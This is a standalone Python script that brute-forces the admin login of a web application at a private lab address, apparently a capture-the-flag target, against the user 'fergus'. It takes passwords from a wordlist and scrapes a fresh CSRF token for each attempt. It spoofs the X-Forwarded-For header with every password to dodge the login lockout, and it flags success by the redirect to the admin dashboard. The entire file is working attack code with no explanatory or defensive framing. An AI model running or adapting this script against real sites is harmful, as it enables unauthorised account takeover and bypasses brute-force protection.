#!/usr/bin/env python3
import re
import requests
import sys

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'

with open(sys.argv[1], 'r') as f:
    wordlist = [x.strip() for x in f.readlines()]

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print(f'\r[*] Trying: {password:<90}'.format(p = password), end="", flush=True)

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print('\rSUCCESS: Password found!' + 50*" ")
            print(f'Use {username}:{password} to login.')
            print()
            break